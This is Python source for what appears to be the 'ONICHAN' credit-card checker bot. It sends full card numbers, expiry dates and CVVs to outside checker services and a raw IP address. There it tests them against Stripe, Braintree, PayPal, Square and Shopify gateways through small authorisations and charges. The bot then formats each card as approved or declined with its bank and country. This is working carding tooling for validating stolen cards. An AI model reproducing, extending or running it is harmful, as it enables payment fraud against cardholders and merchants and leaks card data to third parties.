def check_generic_gate(gate_name, cc, mm, yy, cvv):
    """Generic gate checker with gate-specific API endpoints"""
    start_time = time_module.time()
    
    try:
        # Convert YY to YYYY if needed
        if len(yy) == 2:
            year = f"20{yy}"
        else:
            year = yy
        
        # Build the lista parameter
        lista = f"{cc}|{mm}|{year}|{cvv}"
        lista_short = f"{cc}|{mm}|{yy}|{cvv}"
        
        # Gate-specific API endpoints mapping
        gate_urls = {
            'ss': [  # Stripe Auth
                f"http://15.204.130.9:6969/check?cc={lista}&gate=stripe_auth",
                f"https://freechk.cards/free/stripe.php?lista={lista}",
                f"https://api.nyvexis.com/stripeauth/?lista={lista_short}",
            ],
            'bu': [  # Braintree Auth
                f"http://15.204.130.9:6969/check?cc={lista}&gate=braintree",
                f"https://freechk.cards/free/braintree.php?lista={lista}",
                f"https://api.nyvexis.com/braintree/?lista={lista_short}",
            ],
            'sq': [  # Square Auth
                f"http://15.204.130.9:6969/check?cc={lista}&gate=square",
                f"https://freechk.cards/free/square.php?lista={lista}",
            ],
            'pp': [  # PayPal $1
                f"http://15.204.130.9:6969/check?cc={lista}&gate=paypal",
                f"https://freechk.cards/free/paypal.php?lista={lista}",
                f"https://api.nyvexis.com/paypal/?lista={lista_short}&amount=1",
            ],
            'sor': [  # Stripe $2
                f"http://15.204.130.9:6969/check?cc={lista}&gate=stripe2",
                f"https://freechk.cards/free/stripe.php?lista={lista}&amount=2",
            ],
            'st5': [  # Stripe $5
                f"http://15.204.130.9:6969/check?cc={lista}&gate=stripe5",
                f"https://freechk.cards/free/stripe.php?lista={lista}&amount=5",
            ],
            'st12': [  # Stripe $12
                f"http://15.204.130.9:6969/check?cc={lista}&gate=stripe12",
                f"https://freechk.cards/free/stripe.php?lista={lista}&amount=12",
            ],
            'str': [  # Stripe $15
                f"http://15.204.130.9:6969/check?cc={lista}&gate=stripe15",
                f"https://freechk.cards/free/stripe.php?lista={lista}&amount=15",
            ],
            'dep': [  # Stripe $49
                f"http://15.204.130.9:6969/check?cc={lista}&gate=stripe49",
                f"https://freechk.cards/free/stripe.php?lista={lista}&amount=49",
            ],
        }
        
        # Get gate-specific URLs or use default
        urls = gate_urls.get(gate_name, [
            f"http://15.204.130.9:6969/check?cc={lista}",
            f"https://freechk.cards/free/stripe.php?lista={lista}",
        ])
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        
        for url in urls:
            try:
                response = requests.get(url, headers=headers, timeout=10)
                elapsed = time_module.time() - start_time
                
                if response.status_code == 200:
                    try:
                        data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {"response": response.text}
                    except:
                        data = {"response": response.text}
                    
                    response_text = str(data).lower()
                    
                    if not response_text or len(response_text) < 5:
                        continue
                    
                    # Check for API credit/limit issues - skip to next API
                    credit_issues = ['no have credits', 'no credits', 'out of credits', 'add more credits', 
                                    'buy credits', 'insufficient credits', 'credit limit', 'api limit']
                    if any(issue in response_text for issue in credit_issues):
                        continue  # Try next API endpoint
                    
                    # Check response
                    decline_keywords = ['declined', 'failed', 'error', 'invalid', 'expired', 'rejected', 'denied']
                    if any(kw in response_text for kw in decline_keywords):
                        return {
                            "status": "success",
                            "message": data.get("message", data.get("response", "Card Declined")),
                            "time": round(elapsed, 2)
                        }
                    
                    # Return any valid response
                    actual_msg = data.get("message", data.get("response", response_text[:100]))
                    return {
                        "status": "success",
                        "message": actual_msg,
                        "time": round(elapsed, 2)
                    }
            except:
                continue
        
        # If no URL worked, return proper error
        elapsed = time_module.time() - start_time
        gate_names = {
            'ss': 'Stripe Auth', 'bu': 'Braintree Auth', 'sq': 'Square Auth',
            'pp': 'PayPal $1', 'sor': 'Stripe $2', 'st5': 'Stripe $5',
            'st12': 'Stripe $12', 'str': 'Stripe $15', 'dep': 'Stripe $49'
        }
        gate_display = gate_names.get(gate_name, gate_name.upper())
        return {
            "status": "error",
            "message": f"{gate_display} - All APIs exhausted. Try another gate.",
            "time": round(elapsed, 2)
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Gate connection error: {str(e)[:50]}",
            "time": 0
        }

def check_card_php(gate_name, cc, mm, yy, cvv, user_id,
                   sk_key=None, pp_client_id=None, pp_client_secret=None):
    
    try:
        if not cc or not mm or not yy or not cvv:
            return {
                "status": "error",
                "message": "Missing card details",
                "time": 0
            }
        
        # Ensure all fields are numeric and proper length
        if not cc.isdigit():
            return {"status": "error", "message": "Invalid card format", "time": 0}
        if not mm.isdigit() or len(mm) != 2:
            return {"status": "error", "message": "Invalid card format", "time": 0}
        if not cvv.isdigit() or len(cvv) < 3:
            return {"status": "error", "message": "Invalid card format", "time": 0}
        
        # Convert 4-digit year to 2-digit (e.g., 2026 -> 26)
        if len(yy) == 4 and yy.isdigit():
            yy = yy[-2:]
        elif not (yy.isdigit() and len(yy) == 2):
            return {"status": "error", "message": "Invalid card format", "time": 0}
        
        # Use special APIs for certain gates
        if gate_name == 'st':
            return check_stripe_newrp_gate(cc, mm, yy, cvv)
        if gate_name == 'b3':
            return check_braintree_gate(cc, mm, yy, cvv)
        if gate_name == 'rz':
            return check_razorpay_gate(cc, mm, yy, cvv)
        if gate_name == 'stm':
            return check_stripe_mass_auth_gate(cc, mm, yy, cvv)
        if gate_name == 'se1':
            return check_stripe_charge_gate(cc, mm, yy, cvv)
        if gate_name == 'sh':
            return check_shopify_netherex_gate(cc, mm, yy, cvv)
        if gate_name == 'ss':
            return check_stripe_auth_gate(cc, mm, yy, cvv)
        if gate_name in ['st5', 'st12', 'str', 'dep', 'sor']:
            return check_stripe_amount_gate(cc, mm, yy, cvv, gate_name)

        # Cybor gates — Stripe Auth V1/V2/V3
        if gate_name in ('stv1', 'stv2', 'stv3'):
            return check_stv_gate(gate_name, cc, mm, yy, cvv)

        # Cybor gates — Shopii #1-4
        if gate_name in ('shopii1', 'shopii2', 'shopii3', 'shopii4'):
            return check_shopii_gate(gate_name, cc, mm, yy, cvv)

        # SK-Based CVV
        if gate_name == 'skbased':
            effective_sk = sk_key
            if not effective_sk:
                try:
                    from config import DB_SETTINGS
                    with open(DB_SETTINGS, 'r') as f:
                        for line in f:
                            if line.startswith('default_sk_key='):
                                effective_sk = line.split('=', 1)[1].strip()
                                break
                except Exception:
                    pass
            return check_skbased_gate(cc, mm, yy, cvv, sk_key=effective_sk)

        # PP KeyBased
        if gate_name == 'ppkb':
            return check_pp_keybased_gate(cc, mm, yy, cvv,
                                          client_id=pp_client_id,
                                          client_secret=pp_client_secret)

        # PP #2 (via Netherex PayPal endpoint)
        if gate_name == 'pp2':
            return check_pp2_gate(cc, mm, yy, cvv)

        # B3 #1 / B3 #2
        if gate_name in ('b31', 'b32'):
            return check_b3_variant_gate(gate_name, cc, mm, yy, cvv)

        # Use generic gate checker for all other gates
        return check_generic_gate(gate_name, cc, mm, yy, cvv)
            
    except Exception as e:
        return {
            "status": "error",
            "message": f"Checker Error: {str(e)}",
            "time": 0
        }

_BIN_CACHE = {}

def get_bin_info(cc):
    import requests

    bin_number = cc[:6] if len(cc) >= 6 else 'XXXXXX'

    if bin_number in _BIN_CACHE:
        return _BIN_CACHE[bin_number]

    apis = [
        f"https://lookup.binlist.net/{bin_number}",
        f"https://bins.antipublic.cc/bins/{bin_number}",
    ]

    for api_url in apis:
        try:
            response = requests.get(api_url, timeout=3)
            if response.status_code == 200:
                data = response.json()
                
                if 'scheme' in data:
                    brand = data.get('scheme', 'VISA').upper()
                    card_type = data.get('type', 'CREDIT').upper()
                    level = data.get('prepaid', False)
                    bank_data = data.get('bank', {})
                    bank = bank_data.get('name', 'BANK') if bank_data else 'BANK'
                    country_data = data.get('country', {})
                    country = country_data.get('name', 'UNITED STATES') if country_data else 'UNITED STATES'
                    country_code = country_data.get('alpha2', 'US') if country_data else 'US'
                    emoji = country_data.get('emoji', '🇺🇸') if country_data else '🇺🇸'

                    result = {
                        'bin': bin_number,
                        'brand': brand,
                        'type': card_type,
                        'level': 'DEBIT' if level else 'CREDIT',
                        'bank': bank,
                        'country': country,
                        'country_code': country_code,
                        'emoji': emoji
                    }
                    _BIN_CACHE[bin_number] = result
                    return result
        except Exception as e:
            print(f"BIN lookup error for {api_url}: {e}")
            continue

    bin_first_digit = bin_number[0] if bin_number else '4'

    if bin_first_digit == '4':
        brand = 'VISA'
    elif bin_first_digit == '5':
        brand = 'MASTERCARD'
    elif bin_first_digit == '3':
        brand = 'AMEX'
    elif bin_first_digit == '6':
        brand = 'DISCOVER'
    else:
        brand = 'VISA'

    fallback = {
        'bin': bin_number,
        'brand': brand,
        'type': 'CREDIT',
        'level': 'STANDARD',
        'bank': 'BANK',
        'country': 'UNITED STATES',
        'country_code': 'US',
        'emoji': '🇺🇸'
    }
    _BIN_CACHE[bin_number] = fallback
    return fallback

def clean_json_response(msg):
    """Extract clean message from JSON response strings"""
    import re
    
    # Check if the message looks like JSON
    if msg.startswith('{') and msg.endswith('}'):
        try:
            data = json.loads(msg)
            if isinstance(data, dict):
                # Try to extract clean response from nested structure
                if 'data' in data and isinstance(data['data'], dict):
                    inner = data['data']
                    reason = inner.get('response', inner.get('message', inner.get('status', '')))
                    if reason:
                        return str(reason).replace('_', ' ').title()
                # Try direct fields
                for field in ['response', 'message', 'status', 'error', 'reason']:
                    if field in data and data[field]:
                        val = data[field]
                        if isinstance(val, str):
                            return val.replace('_', ' ').title()
        except:
            pass
    return msg

def format_gate_response(result, gate_name, cc, mm, yy, cvv, username, elapsed_time=0):
    
    # Clean the message from decorative elements
    if result.get("message"):
        msg = result["message"]
        
        # First, try to clean JSON responses
        if '{' in msg and '}' in msg:
            # Find JSON object - handle nested braces
            start_idx = msg.find('{')
            if start_idx != -1:
                prefix = msg[:start_idx].strip().rstrip('-').strip()
                json_str = msg[start_idx:]
                # Fix Python-style booleans to JSON-style
                json_str = json_str.replace('False', 'false').replace('True', 'true').replace('None', 'null')
                # Try to parse entire JSON from this point
                try:
                    data = json.loads(json_str)
                    if isinstance(data, dict):
                        extracted = None
                        # Deep extraction for nested structures like Data.Error.Message
                        if 'Data' in data and isinstance(data['Data'], dict):
                            inner = data['Data']
                            if 'Error' in inner and isinstance(inner['Error'], dict):
                                extracted = inner['Error'].get('Message', inner['Error'].get('message', ''))
                            elif 'error' in inner and isinstance(inner['error'], dict):
                                extracted = inner['error'].get('Message', inner['error'].get('message', ''))
                            else:
                                extracted = inner.get('response', inner.get('message', inner.get('Message', '')))
                        # Also check lowercase 'data'
                        elif 'data' in data and isinstance(data['data'], dict):
                            inner = data['data']
                            if 'error' in inner and isinstance(inner['error'], dict):
                                extracted = inner['error'].get('message', inner['error'].get('Message', ''))
                            elif 'Error' in inner and isinstance(inner['Error'], dict):
                                extracted = inner['Error'].get('Message', inner['Error'].get('message', ''))
                            else:
                                extracted = inner.get('response', inner.get('message', inner.get('status', '')))
                        # Try direct fields
                        if not extracted:
                            for field in ['response', 'message', 'Message', 'error', 'Error', 'reason']:
                                if field in data:
                                    val = data[field]
                                    if isinstance(val, str):
                                        extracted = val
                                        break
                                    elif isinstance(val, dict):
                                        extracted = val.get('message', val.get('Message', ''))
                                        if extracted:
                                            break
                        if extracted and isinstance(extracted, str):
                            clean_msg = extracted.replace('_', ' ')
                            # Don't re-capitalize if already has proper case
                            if clean_msg.islower():
                                clean_msg = clean_msg.title()
                            msg = clean_msg
                except:
                    # If JSON parse fails, try regex to extract message
                    match = re.search(r'"[Mm]essage"\s*:\s*"([^"]+)"', json_str)
                    if match:
                        msg = match.group(1)
        
        # Sanitize HTML - remove ALL HTML tags from external API responses (they can be malformed)
        msg = re.sub(r'<br\s*/?>', ' ', msg, flags=re.IGNORECASE)
        msg = re.sub(r'<[^>]+>', '', msg)  # Remove all HTML tags completely
        msg = re.sub(r'&nbsp;', ' ', msg, flags=re.IGNORECASE)
        msg = re.sub(r'&amp;', '&', msg, flags=re.IGNORECASE)
        msg = re.sub(r'&lt;', '<', msg, flags=re.IGNORECASE)
        msg = re.sub(r'&gt;', '>', msg, flags=re.IGNORECASE)
        msg = re.sub(r'\s+', ' ', msg).strip()  # Normalize whitespace
        result["message"] = msg
        
        # Remove all decorative boxes and headers
        decorative_items = [
            'CC CHECKING', 'Transaction', 'BIN DETAILS', 'CHECK INFO',
            'CARD →', 'STATUS →', 'RESPONSE →', 'GATEWAY →',
            'Bin →', 'Bank →', 'Country →', 'Proxy →',
            '═════', '║', '╔', '╚', '║',
            'RESPONSE', 'GATEWAY', 'Bin Details', 'Check Info', 'Proxy'
        ]
        
        lines = msg.split('\n')
        clean_lines = []
        
        for line in lines:
            # Skip empty lines and decorative lines
            if not line.strip():
                continue
            if any(item in line for item in ['═', '║', '╔', '╚', '🎀']):
                continue
            if any(header in line for header in ['CC CHECKING', 'Transaction', 'BIN DETAILS', 'CHECK INFO']):
                continue
            
            # Extract actual info if it has → in it
            if '→' in line:
                parts = line.split('→')
                if len(parts) > 1:
                    value = parts[1].strip()
                    clean_lines.append(value)
            elif line.strip():
                clean_lines.append(line.strip())
        
        # Keep only the response message
        clean_msg = ' '.join(clean_lines).strip() if clean_lines else result["message"]
        
        # Additional cleanup for common patterns
        if "Warning:" in clean_msg or "Deprecated:" in clean_msg or "Fatal error:" in clean_msg:
            clean_lines = [l for l in clean_msg.split() if not any(x in l for x in ['Warning:', 'Deprecated:', 'Fatal error:', 'on line', '.php'])]
            clean_msg = ' '.join(clean_lines).strip() if clean_lines else "Card Checked"
        
        result["message"] = clean_msg
    
    bin_info = get_bin_info(cc)

    gate_names = {
        'st': 'Stripe Auth', 'ss': 'Stripe Auth $0.5', 'bu': 'Braintree Auth',
        'sq': 'Square Auth', 'pp': 'PayPal $1', 'ppv': 'PayPal V2',
        'sor': 'Stripe $2', 'st5': 'Stripe $5', 'st12': 'Stripe $12',
        'str': 'Stripe $15', 'dep': 'Stripe $49', 'auz': 'Authorize $0',
        'asd': 'Authorize $7', 'atf': 'Authorize $25', 'anh': 'Authorize $200',
        'sh6': 'Shopify $6', 'sh8': 'Shopify $8', 'sh10': 'Shopify $10',
        'sh13': 'Shopify $13', 'bt1': 'Braintree $1', 'bt3d': 'Braintree 3D',
        'b3n': 'Braintree $5', 'rz': 'Razorpay ₹10', 'stm': 'Stripe Mass Auth',
        'se1': 'Stripe €1', 'sh': 'Shopify', 'b3': 'Braintree $3',
        'st1': 'Stripe $1', 'ast': 'Auto Stripe',
    }

    full_gate_name = gate_names.get(gate_name, gate_name.upper())

    return _onichan_format(result, cc, mm, yy, cvv, bin_info, full_gate_name, elapsed_time, username)


def _clean_response_msg(raw_msg):
    """Extract a clean short response from raw API output (handles JSON, etc.)"""
    if not raw_msg:
        return "Unknown"
    msg = str(raw_msg).strip()

    if '{' in msg and '}' in msg:
        start = msg.find('{')
        json_str = msg[start:]
        json_str = json_str.replace('False', 'false').replace('True', 'true').replace('None', 'null')
        try:
            data = json.loads(json_str)
            if isinstance(data, dict):
                if 'result' in data and isinstance(data['result'], dict):
                    inner = data['result']
                    for f in ['error', 'message', 'Message', 'response', 'status']:
                        v = inner.get(f)
                        if v and isinstance(v, str) and len(v) > 2:
                            msg = v
                            break
                elif 'Data' in data and isinstance(data['Data'], dict):
                    inner = data['Data']
                    if 'Error' in inner and isinstance(inner['Error'], dict):
                        msg = inner['Error'].get('Message', inner['Error'].get('message', msg))
                    else:
                        msg = inner.get('response', inner.get('message', msg))
                elif 'data' in data and isinstance(data['data'], dict):
                    inner = data['data']
                    if 'error' in inner and isinstance(inner['error'], dict):
                        msg = inner['error'].get('message', msg)
                    else:
                        msg = inner.get('response', inner.get('message', msg))
                else:
                    for f in ['error', 'response', 'message', 'Message', 'reason']:
                        v = data.get(f)
                        if v and isinstance(v, str) and len(v) > 2:
                            msg = v
                            break
        except:
            m = re.search(r'"(?:error|message|Message|response)"\s*:\s*"([^"]+)"', json_str)
            if m:
                msg = m.group(1)

    msg = re.sub(r'Response\s*-?\s*', '', msg).strip()
    msg = re.sub(r'<[^>]+>', '', msg)
    msg = re.sub(r'\s+', ' ', msg).strip()
    msg = msg.replace('_', ' ')
    if msg.islower():
        msg = msg.title()

    response_clean_map = {
        'succeeded': 'Approved',
        'payment method added': 'Approved',
        'card valid': 'Card Valid', 'card approved': 'Card Approved',
        'charged': 'Charged', 'authorized': 'Authorized',
        '3d secure required': '3DS Required [Live]',
        '3ds authentication required': '3DS Required [Live]',
        'insufficient funds': 'Insufficient Funds [Live]',
        'cvv incorrect': 'CVV Incorrect [Live]',
        'your card was declined': 'Declined',
        'generic_decline': 'Declined', 'generic decline': 'Declined',
        'do_not_honor': 'Do Not Honor', 'do not honor': 'Do Not Honor',
        'lost_card': 'Lost Card', 'lost card': 'Lost Card',
        'stolen_card': 'Stolen Card', 'stolen card': 'Stolen Card',
        'expired_card': 'Card Expired', 'expired card': 'Card Expired',
        'invalid_cvc': 'Invalid CVV', 'invalid cvc': 'Invalid CVV',
        'actionrequiredreceipt': '3DS Required [Live]',
        'failed': 'Declined',
    }
    ml = msg.lower()
    for pattern, clean in response_clean_map.items():
        if pattern in ml:
            msg = clean
            break

    if len(msg) > 60:
        msg = msg[:57] + "..."

    return msg


def _onichan_format(result, cc, mm, yy, cvv, bin_info, gate_display, elapsed_time, username):
    """Unified Onichan branding format for all gates — compact"""
    from config import SUPPORT_USERNAME

    card_display = f"{cc}|{mm}|{yy}|{cvv}"
    response_msg = _clean_response_msg(result.get("message", "Unknown"))
    rl = response_msg.lower()

    decline_kw = ['declined', 'error', 'failed', 'invalid', 'expired', 'denied', 'rejected', 'incorrect']
    approve_kw = ['approved', 'success', 'valid', 'charged', 'authorized', 'captured', 'paid',
                  'insufficient funds', '3d secure', '3ds required', 'cvv incorrect', 'live']
    is_declined = any(k in rl for k in decline_kw)
    is_approved = any(k in rl for k in approve_kw) and not is_declined

    if is_approved:
        status_line = "Approved ✅"
    elif result.get("status") == "error":
        status_line = "Error ⚠️"
    else:
        status_line = "Declined ❌"

    brand = bin_info.get('brand', 'Unknown')
    card_type = bin_info.get('type', '')
    level = bin_info.get('level', '')
    parts_seen = {brand.upper()}
    network_parts = [brand]
    if card_type and card_type.upper() not in ('UNKNOWN', '') and card_type.upper() not in parts_seen:
        parts_seen.add(card_type.upper())
        network_parts.append(card_type)
    if level and level.upper() not in ('UNKNOWN', '') and level.upper() not in parts_seen:
        network_parts.append(level)
    network_line = " • ".join(network_parts)

    country = bin_info.get('country', 'Unknown')
    bank = bin_info.get('bank', 'Unknown')
    bin_code = bin_info.get('bin', cc[:6])

    sep = "━━━━━━━━━━━━━━━━━━━━"

    return f"""💜 <b>ONICHAN • {gate_display.upper()}</b>
{sep}
💳 <code>{card_display}</code>
{sep}
📉 <b>Status</b>   : {status_line}
💬 <b>Response</b> : {response_msg}
{sep}
🔢 <b>BIN</b>      : {bin_code}
💠 <b>Network</b>  : {network_line}
🏦 <b>Bank</b>     : {bank}
🌍 <b>Country</b>  : {country}
{sep}
⏱ <b>Time</b>     : {elapsed_time:.2f}s
👤 <b>User</b>     : @{username}
⚡ <b>Powered</b>  : @{SUPPORT_USERNAME}"""
